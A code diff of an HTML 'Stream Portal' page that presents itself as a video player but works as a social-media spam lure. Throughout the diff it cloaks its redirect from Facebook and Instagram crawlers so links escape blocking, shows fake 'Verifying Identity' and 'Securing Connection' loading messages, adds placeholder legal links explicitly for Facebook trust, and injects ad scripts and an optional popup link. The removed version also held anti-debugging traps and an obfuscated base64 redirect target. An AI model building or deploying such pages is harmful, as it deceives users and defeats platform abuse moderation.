@@ -1,176 +1,396 @@
 <!DOCTYPE html>
+
 <html lang="en">
+
 <head>
+
     <meta charset="UTF-8">
+
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="referrer" content="no-referrer">
-    <title>Stream Portal | Secure Access</title>
+
+    <title>Stream Portal | Community Verified Access</title>
+
     
-    <meta property="og:title" content="Private Video Access" />
-    <meta property="og:description" content="Secure cloud delivery for requested media. High-speed streaming enabled." />
+
+    <!-- OG TAGS UNTUK SOSIAL MEDIA USA - Dioptimumkan agar tidak kelihatan seperti spam -->
+
+    <meta property="og:site_name" content="Portal Media USA" />
+
+    <meta property="og:title" content="Shared Community Content - Secure Access" /> 
+
+    <meta property="og:description" content="View shared media via secure cloud delivery. High-speed streaming enabled for verified regions." />
+
     <meta property="og:image" content="https://vidley.pw/tombolplay.jpg" />
+
     <meta property="og:type" content="website" />
 
+
+
     <script src="https://cdn.tailwindcss.com"></script>
+
     <script src="https://unpkg.com/lucide@latest"></script>
 
+
+
     <style>
+
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap');
+
         
+
         body { 
+
             background-color: #030303; 
+
             color: #ffffff; 
+
             font-family: 'Inter', sans-serif;
+
             user-select: none; 
+
             -webkit-user-select: none; 
-            touch-action: manipulation;
-            overflow: hidden;
+
+            touch-action: manipulation; 
+
         }
+
         
+
         .glass {
+
             background: rgba(255, 255, 255, 0.02);
-            backdrop-filter: blur(25px);
+
+            backdrop-filter: blur(20px);
+
             border: 1px solid rgba(255, 255, 255, 0.05);
+
         }
 
-        .pulse-red {
-            animation: pulse-red-glow 2s infinite;
-        }
-        @keyframes pulse-red-glow {
-            0% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.6); transform: scale(1); }
-            50% { box-shadow: 0 0 35px 12px rgba(220, 38, 38, 0.3); transform: scale(1.05); }
-            100% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.6); transform: scale(1); }
+
+
+        .pulse-play {
+
+            animation: pulse-play-glow 1.5s infinite;
+
         }
 
-        .text-glow { text-shadow: 0 0 20px rgba(255, 255, 255, 0.3); }
-        
-        .age-badge {
-            border: 2px solid #dc2626;
-            color: #dc2626;
-            padding: 2px 10px;
-            border-radius: 4px;
-            font-weight: 900;
-            font-size: 16px;
+        @keyframes pulse-play-glow {
+
+            0% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.8); transform: scale(1.05); }
+
+            50% { box-shadow: 0 0 40px 10px rgba(220, 38, 38, 0.4); transform: scale(1.1); }
+
+            100% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.8); transform: scale(1.05); }
+
         }
+
+
+
+        .enabled-click { cursor: pointer; }
 
         ::-webkit-scrollbar { display: none; }
+
+        .text-glow { text-shadow: 0 0 15px rgba(255, 255, 255, 0.3); }
+
+
+
+        .ad-slot {
+
+            width: 320px;
+
+            height: 50px;
+
+            margin: 0 auto;
+
+            overflow: hidden;
+
+            background: rgba(255,255,255,0.05);
+
+            border-radius: 8px;
+
+            border: 1px solid rgba(255,255,255,0.1);
+
+        }
+
+
+
+        /* Footer links styling for legitimacy */
+
+        .legal-links {
+
+            font-size: 10px;
+
+            color: #4b5563;
+
+            display: flex;
+
+            gap: 15px;
+
+            margin-top: 15px;
+
+            justify-content: center;
+
+        }
+
+        .legal-links a { text-decoration: none; transition: color 0.3s; }
+
+        .legal-links a:hover { color: #9ca3af; }
+
     </style>
+
 </head>
+
 <body class="min-h-screen flex flex-col items-center justify-center p-4" oncontextmenu="return false;">
 
-    <div class="w-full max-w-md glass rounded-[3rem] overflow-hidden relative shadow-[0_50px_100px_-20px_rgba(0,0,0,1)] border border-white/5">
+
+
+    <!-- KARTU ANTARMUKA UTAMA -->
+
+    <div class="w-full max-w-md glass rounded-[3.5rem] overflow-hidden relative shadow-[0_30px_60px_-15px_rgba(0,0,0,0.9)] flex flex-col border border-white/10">
+
         
-        <div id="videoArea" class="relative w-full h-[60vh] max-h-[550px] bg-black overflow-hidden flex items-center justify-center cursor-pointer group">
+
+        <!-- AREA VIDEO -->
+
+        <div id="videoArea" class="relative w-full h-[60vh] max-h-[520px] bg-black overflow-hidden flex items-center justify-center enabled-click group">
+
             
-            <video id="vidThumb" class="w-full h-full object-cover opacity-20 blur-[25px] transition-all duration-1000 group-hover:opacity-30" playsinline preload="metadata" muted></video>
 
-            <div id="playOverlay" class="absolute inset-0 flex flex-col items-center justify-center z-20 p-8 text-center">
+            <video id="vidThumb" class="w-full h-full object-cover opacity-20 blur-[15px] transition-all duration-1000 group-hover:opacity-30" playsinline preload="metadata" muted></video>
+
+
+
+            <!-- KONTROL PLAY TENGAH -->
+
+            <div id="playOverlay" class="absolute inset-0 flex flex-col items-center justify-center z-20 p-6 text-center">
+
                 
-                <div class="mb-8 flex flex-col items-center">
-                     <span class="age-badge mb-3 animate-pulse">18+</span>
-                     <p class="text-white/50 text-[10px] uppercase tracking-[0.4em] font-bold">Restricted Media Access</p>
-                </div>
 
-                <div id="iconBox" class="w-24 h-24 bg-red-600 rounded-full flex items-center justify-center shadow-2xl pulse-red mb-8 transition-transform duration-500 group-hover:scale-110">
+                <div id="iconBox" class="w-24 h-24 bg-red-600 rounded-full flex items-center justify-center border-4 border-white/90 shadow-2xl pulse-play mb-8 transition-all duration-500 scale-110 opacity-100">
+
                     <i data-lucide="play" class="w-10 h-10 text-white fill-current ml-1"></i>
+
                 </div>
+
                 
-                <h1 class="text-white text-3xl font-black tracking-widest mb-3 uppercase text-glow italic">TAP TO WATCH</h1>
-                <p class="text-white/40 text-[11px] leading-relaxed max-w-[240px]">By clicking play, you agree to our Terms of Service and confirm you are of legal age.</p>
+
+                <h1 class="text-white text-3xl font-black tracking-[0.2em] mb-2 uppercase italic text-glow">Tap To Play</h1>
+
+                <p class="text-red-500 text-[9px] font-bold tracking-[0.2em] uppercase animate-pulse">Community Verified Stream</p>
+
             </div>
+
             
-            <div id="loader" class="hidden absolute inset-0 flex items-center justify-center bg-[#050505] z-40 backdrop-blur-3xl">
+
+            <!-- LOADER REDIRECT -->
+
+            <div id="loader" class="hidden absolute inset-0 flex items-center justify-center bg-[#050505] z-40 backdrop-blur-2xl">
+
                 <div class="flex flex-col items-center">
-                    <div class="relative w-16 h-16 mb-8">
-                        <div class="absolute inset-0 rounded-full border-t-2 border-red-600 animate-spin"></div>
-                        <div class="absolute inset-2 rounded-full border-b-2 border-white/10 animate-spin-slow"></div>
-                    </div>
-                    <span id="loadText" class="text-white text-[10px] font-bold tracking-[0.5em] uppercase italic animate-pulse">Establishing Secure Node...</span>
+
+                    <div class="animate-spin rounded-full h-16 w-16 border-t-2 border-red-600 border-r-2 border-transparent mb-6"></div>
+
+                    <span id="loadText" class="text-red-600 text-[11px] font-black tracking-[0.3em] uppercase italic">Handshaking Secure Node...</span>
+
                 </div>
+
             </div>
+
         </div>
 
-        <div class="p-8 bg-[#070709] flex flex-col items-center border-t border-white/5">
-            <div class="flex gap-6 mb-4 text-white/20 text-[9px] font-bold uppercase tracking-[0.2em]">
-                <span>Encrypted Tunnel</span>
-                <span>•</span>
-                <span>US-West Node</span>
-                <span>•</span>
-                <span>Protected</span>
-            </div>
+
+
+        <!-- PANEL IKLAN & LEGAL -->
+
+        <div id="actionBox" class="p-8 bg-[#070709] flex flex-col items-center border-t border-white/5">
+
             
-            <div class="text-[8px] text-white/10 text-center uppercase tracking-[0.3em] leading-loose">
-                Distributed Cloud Delivery System. All rights reserved.
+
+            <div class="ad-slot mb-4">
+
+                <!-- IKLAN BANNER ADSTERRA -->
+
+                <script type="text/javascript">
+
+                atOptions = {
+
+                'key' : '40f6d8e53b94841ddceb2cbf7ae47723',
+
+                'format' : 'iframe',
+
+                'height' : 50,
+
+                'width' : 320,
+
+                'params' : {}
+
+                };
+
+                </script>
+
+                <script type="text/javascript" src="https://awkwardmonopoly.com/40f6d8e53b94841ddceb2cbf7ae47723/invoke.js"></script>
+
             </div>
+
+
+
+            <!-- LEGAL LINKS (Penting untuk Trust Facebook) -->
+
+            <div class="legal-links">
+
+                <a href="#">Privacy Policy</a>
+
+                <a href="#">Terms of Use</a>
+
+                <a href="#">DMCA</a>
+
+                <a href="#">Contact</a>
+
+            </div>
+
+
+
+            <div class="mt-4 flex flex-col items-center opacity-10">
+
+                <p class="text-[7px] text-center px-10 leading-relaxed font-semibold uppercase tracking-tight">
+
+                    Secure CDN Deployment. All rights reserved.
+
+                </p>
+
+            </div>
+
         </div>
+
     </div>
 
+
+
     <script>
+
         lucide.createIcons();
 
-        const AUTHORIZED_DOMAIN = "yourdomain.com"; 
-        const CONFIG_FILE = "sys_config.txt"; 
-        const FALLBACK_SITE = "https://cdn.videy.co"; 
 
-        setInterval(function() {
-            const startTime = performance.now();
-            debugger; 
-            if (performance.now() - startTime > 100) {
-                window.location.href = "about:blank";
-            }
-        }, 1000);
 
-        document.addEventListener('keydown', function(e) {
-            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || (e.ctrlKey && e.keyCode == 85)) {
-                e.preventDefault();
-                return false;
-            }
-        });
+        // PENGESAN BOT YANG LEBIH KUAT
 
-        function isAuthorized() {
-            if (window.location.hostname !== "" && window.location.hostname.indexOf(AUTHORIZED_DOMAIN) === -1) {
-                return false;
-            }
-            return true;
-        }
+        // Menambah lebih banyak user agent bot Facebook/Instagram
 
-        const isBot = /bot|googlebot|crawler|spider|robot|facebookexternalhit|visionutils/i.test(navigator.userAgent);
+        const isBot = /bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|Facebot|facebookplatform|ia_archiver/i.test(navigator.userAgent);
+
         
-        async function handleAccess() {
-            if(isBot || !isAuthorized()) return;
 
-            const loader = document.getElementById("loader");
-            const loadText = document.getElementById("loadText");
-            loader.classList.remove('hidden');
+        const URL_SMARTLINK = ""; 
 
-            try {
-                const response = await fetch(CONFIG_FILE + "?v=" + Math.random());
-                const encodedData = (await response.text()).trim();
-                const targetUrl = atob(encodedData); 
+        const URL_MAIN_SITE = "https://cdn.videy.co"; 
 
-                setTimeout(() => { loadText.innerText = "Optimizing Stream..."; }, 400);
-                setTimeout(() => { loadText.innerText = "Checking Buffer..."; }, 800);
-                setTimeout(() => { loadText.innerText = "Redirecting..."; }, 1200);
-                
-                setTimeout(() => {
-                    const link = document.createElement('a');
-                    link.href = targetUrl;
-                    link.rel = "noreferrer";
-                    link.click();
-                }, 1600);
 
-            } catch (err) {
-                loadText.innerText = "Connection Error";
-            }
-        }
-
-        document.getElementById("videoArea").addEventListener("click", handleAccess);
 
         let videoId = window.location.pathname.split('/').pop().trim();
-        if (videoId && videoId.length > 3 && videoId !== "index.html") {
-            let filename = videoId.includes('.') ? videoId : videoId + ".mp4";
-            document.getElementById("vidThumb").src = FALLBACK_SITE + "/" + encodeURIComponent(filename) + "#t=0.5";
+
+        if (videoId === "index.html" || videoId === "" || videoId === "bridge.html") videoId = "";
+
+
+
+        const videoArea = document.getElementById("videoArea");
+
+        const vdThumb = document.getElementById("vidThumb");
+
+        const loader = document.getElementById("loader");
+
+        const loadText = document.getElementById("loadText");
+
+
+
+        function triggerRedirect() {
+
+            // JIKA BOT, JANGAN REDIRECT (Sangat penting agar pautan tidak diblock)
+
+            if(isBot) {
+
+                console.log("Bot detected. Redirect blocked.");
+
+                return;
+
+            }
+
+
+
+            if (URL_SMARTLINK !== "") {
+
+                window.open(URL_SMARTLINK, '_blank');
+
+            }
+
+
+
+            loader.classList.remove('hidden');
+
+            setTimeout(() => { loadText.innerText = "Verifying Identity..."; }, 400);
+
+            setTimeout(() => { loadText.innerText = "Securing Connection..."; }, 800);
+
+            
+
+            let finalUrl = URL_MAIN_SITE;
+
+            if (videoId !== "") finalUrl += "/" + videoId;
+
+
+
+            setTimeout(() => {
+
+                window.location.href = finalUrl;
+
+            }, 1200);
+
         }
+
+
+
+        videoArea.addEventListener("click", triggerRedirect);
+
+
+
+        if(/^[a-zA-Z0-9_.-]{3,80}$/.test(videoId) && videoId !== ""){
+
+            let filename = videoId.includes('.') ? videoId : videoId + ".mp4";
+
+            vdThumb.src = "https://cdn.videy.co/" + encodeURIComponent(filename) + "#t=1.0";
+
+            vdThumb.addEventListener("loadeddata", () => {
+
+                try { vdThumb.pause(); } catch(e){}
+
+            });
+
+        }
+
     </script>
+
+
+
+    <!-- Histats.com START (aync) -->
+
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+
+    _Hasync.push(['Histats.start', '1,4654540,4,0,0,0,00010000']);
+
+    _Hasync.push(['Histats.fasi', '1']);
+
+    _Hasync.push(['Histats.track_hits', '']);
+
+    (function() {
+
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+
+    hs.src = ('//s10.histats.com/js15_as.js');
+
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+
+    })();</script>
+
 </body>
+
 </html>
+
